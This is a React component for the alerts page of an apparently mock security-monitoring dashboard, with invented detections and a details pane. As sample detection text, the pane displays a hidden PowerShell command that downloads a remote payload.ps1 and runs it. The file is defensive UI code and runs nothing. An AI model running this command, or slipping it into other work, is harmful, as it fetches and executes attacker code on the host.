import { useState, lazy, Suspense } from 'react';
import { AlertTable, Alert } from '../components/crowdstrike/AlertTable';
import { Filter, X, Search, FileCode } from 'lucide-react';

const EventSearch = lazy(() => import('../components/EventSearch'));
const FileAnalysis = lazy(() => import('../components/FileAnalysis'));

export default function Alerts() {
  const [selectedAlertId, setSelectedAlertId] = useState<string | number | null>(null);
  const [activeView, setActiveView] = useState<'alerts' | 'search' | 'files'>('alerts');

  // Mock Data
  const alerts: Alert[] = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15].map((i) => ({
    id: i,
    severity: i % 4 === 0 ? 'critical' : i % 3 === 0 ? 'high' : i % 2 === 0 ? 'medium' : 'low',
    title: i % 4 === 0 ? 'Ransomware Activity Detected' : i % 3 === 0 ? 'Suspicious PowerShell Execution' : 'Port Scan Detected',
    host: `WKSTN-FIN-0${i}`,
    time: `${i * 12}m ago`,
    status: i < 5 ? "NEW" : "IN PROGRESS"
  }));

  const selectedAlert = alerts.find(a => a.id === selectedAlertId);

  return (
    <div className="h-full flex flex-col gap-4">
      {/* Sub-Navigation Tabs */}
      <div className="flex items-center gap-2 bg-[var(--bg-panel)] p-2 border border-[var(--border-subtle)] rounded">
        <button
          onClick={() => setActiveView('alerts')}
          className={`flex items-center gap-2 px-4 py-2 rounded text-sm font-medium transition-colors ${
            activeView === 'alerts'
              ? 'bg-[var(--sev-info)] text-white'
              : 'bg-[var(--bg-hover)] text-[var(--text-secondary)] hover:text-[var(--text-primary)]'
          }`}
        >
          <Filter className="w-4 h-4" />
          Detections
        </button>
        <button
          onClick={() => setActiveView('search')}
          className={`flex items-center gap-2 px-4 py-2 rounded text-sm font-medium transition-colors ${
            activeView === 'search'
              ? 'bg-[var(--sev-info)] text-white'
              : 'bg-[var(--bg-hover)] text-[var(--text-secondary)] hover:text-[var(--text-primary)]'
          }`}
        >
          <Search className="w-4 h-4" />
          Event Search
        </button>
        <button
          onClick={() => setActiveView('files')}
          className={`flex items-center gap-2 px-4 py-2 rounded text-sm font-medium transition-colors ${
            activeView === 'files'
              ? 'bg-[var(--sev-info)] text-white'
              : 'bg-[var(--bg-hover)] text-[var(--text-secondary)] hover:text-[var(--text-primary)]'
          }`}
        >
          <FileCode className="w-4 h-4" />
          File Analysis
        </button>
      </div>

      {/* Alerts View */}
      {activeView === 'alerts' && (
        <>
          {/* Filter Bar */}
          <div className="flex justify-between items-center bg-[var(--bg-panel)] p-4 border border-[var(--border-subtle)] rounded">
            <div className="flex items-center gap-4">
              <h2 className="text-lg font-semibold text-[var(--text-primary)]">Detections</h2>
              <div className="h-6 w-px bg-[var(--border-subtle)]" />
              <div className="flex gap-2">
                <button className="px-3 py-1.5 bg-[var(--bg-hover)] rounded text-xs text-[var(--text-secondary)] border border-[var(--border-subtle)] flex items-center gap-2 hover:text-[var(--text-primary)] transition-colors">
                  <Filter className="w-3 h-3" />
                  Severity: All
                </button>
                <button className="px-3 py-1.5 bg-[var(--bg-hover)] rounded text-xs text-[var(--text-secondary)] border border-[var(--border-subtle)] hover:text-[var(--text-primary)] transition-colors">
                  Status: New
                </button>
                <button className="px-3 py-1.5 bg-[var(--bg-hover)] rounded text-xs text-[var(--text-secondary)] border border-[var(--border-subtle)] hover:text-[var(--text-primary)] transition-colors">
                  Time: Last 24h
                </button>
              </div>
            </div>
            <div className="text-xs text-[var(--text-secondary)]">
              Showing {alerts.length} items
            </div>
          </div>

          {/* Split View Content */}
          <div className="flex-1 flex gap-4 overflow-hidden">
            {/* Left: Alert List */}
            <div className={`flex-1 transition-all duration-300 ${selectedAlertId ? 'w-1/2' : 'w-full'}`}>
              <AlertTable 
                alerts={alerts}
                selectedId={selectedAlertId}
                onSelect={setSelectedAlertId}
              />
            </div>

            {/* Right: Details Pane (Visible when selected) */}
            {selectedAlertId && selectedAlert && (
              <div className="w-[600px] bg-[var(--bg-panel)] border border-[var(--border-subtle)] rounded flex flex-col animate-in slide-in-from-right-4 duration-200">
                <div className="p-4 border-b border-[var(--border-subtle)] flex justify-between items-start">
                  <div>
                    <div className="flex items-center gap-2 mb-2">
                      <div className={`w-2 h-2 rounded-full bg-[var(--sev-${selectedAlert.severity})]`} />
                      <span className="text-xs font-mono text-[var(--text-secondary)] uppercase tracking-wider">{selectedAlert.severity}</span>
                    </div>
                    <h3 className="text-lg font-semibold text-[var(--text-primary)]">{selectedAlert.title}</h3>
                  </div>
                  <button 
                    onClick={() => setSelectedAlertId(null)}
                    className="p-1 hover:bg-[var(--bg-hover)] rounded text-[var(--text-secondary)]"
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>
                
                <div className="p-6 overflow-y-auto flex-1 space-y-6">
                  {/* Context Section */}
                  <div className="grid grid-cols-2 gap-4">
                    <div className="p-3 bg-[var(--bg-app)] rounded border border-[var(--border-subtle)]">
                      <div className="text-xs text-[var(--text-secondary)] uppercase mb-1">Host</div>
                      <div className="text-sm font-mono text-[var(--text-primary)]">{selectedAlert.host}</div>
                    </div>
                    <div className="p-3 bg-[var(--bg-app)] rounded border border-[var(--border-subtle)]">
                      <div className="text-xs text-[var(--text-secondary)] uppercase mb-1">Time</div>
                      <div className="text-sm font-mono text-[var(--text-primary)]">{selectedAlert.time}</div>
                    </div>
                  </div>

                  {/* Actions */}
                  <div>
                    <h4 className="text-xs font-bold text-[var(--text-secondary)] uppercase mb-3">Response Actions</h4>
                    <div className="flex gap-3">
                      <button className="flex-1 py-2 bg-[var(--sev-critical)] text-white rounded text-sm font-medium hover:opacity-90 transition-opacity">
                        Isolate Host
                      </button>
                      <button className="flex-1 py-2 bg-[var(--bg-hover)] text-[var(--text-primary)] border border-[var(--border-subtle)] rounded text-sm font-medium hover:bg-[var(--border-subtle)] transition-colors">
                        View Process Tree
                      </button>
                    </div>
                  </div>

                  {/* Details */}
                  <div>
                    <h4 className="text-xs font-bold text-[var(--text-secondary)] uppercase mb-3">Detection Details</h4>
                    <div className="text-sm text-[var(--text-secondary)] leading-relaxed">
                      <p className="mb-2">
                        The sensor detected a suspicious PowerShell command execution on <strong>{selectedAlert.host}</strong>.
                        The command attempted to download an executable from an external IP address known for hosting malware.
                      </p>
                      <code className="block p-3 bg-[var(--bg-app)] rounded border border-[var(--border-subtle)] font-mono text-xs text-[var(--text-primary)] overflow-x-auto">
                        powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.100/payload.ps1'))"
                      </code>
                    </div>
                  </div>
                </div>
                
                <div className="p-4 border-t border-[var(--border-subtle)] bg-[var(--bg-app)]">
                  <div className="flex justify-between items-center text-xs text-[var(--text-secondary)]">
                    <span>Alert ID: {selectedAlert.id}</span>
                    <span className="px-2 py-1 bg-[var(--bg-hover)] rounded border border-[var(--border-subtle)]">Status: {selectedAlert.status}</span>
                  </div>
                </div>
              </div>
            )}
          </div>
        </>
      )}

      {/* Event Search View */}
      {activeView === 'search' && (
        <div className="flex-1 overflow-hidden">
          <Suspense fallback={<div className="h-full bg-[var(--bg-panel)] animate-pulse rounded" />}>
            <EventSearch />
          </Suspense>
        </div>
      )}

      {/* File Analysis View */}
      {activeView === 'files' && (
        <div className="flex-1 overflow-hidden">
          <Suspense fallback={<div className="h-full bg-[var(--bg-panel)] animate-pulse rounded" />}>
            <FileAnalysis />
          </Suspense>
        </div>
      )}
    </div>
  );
}
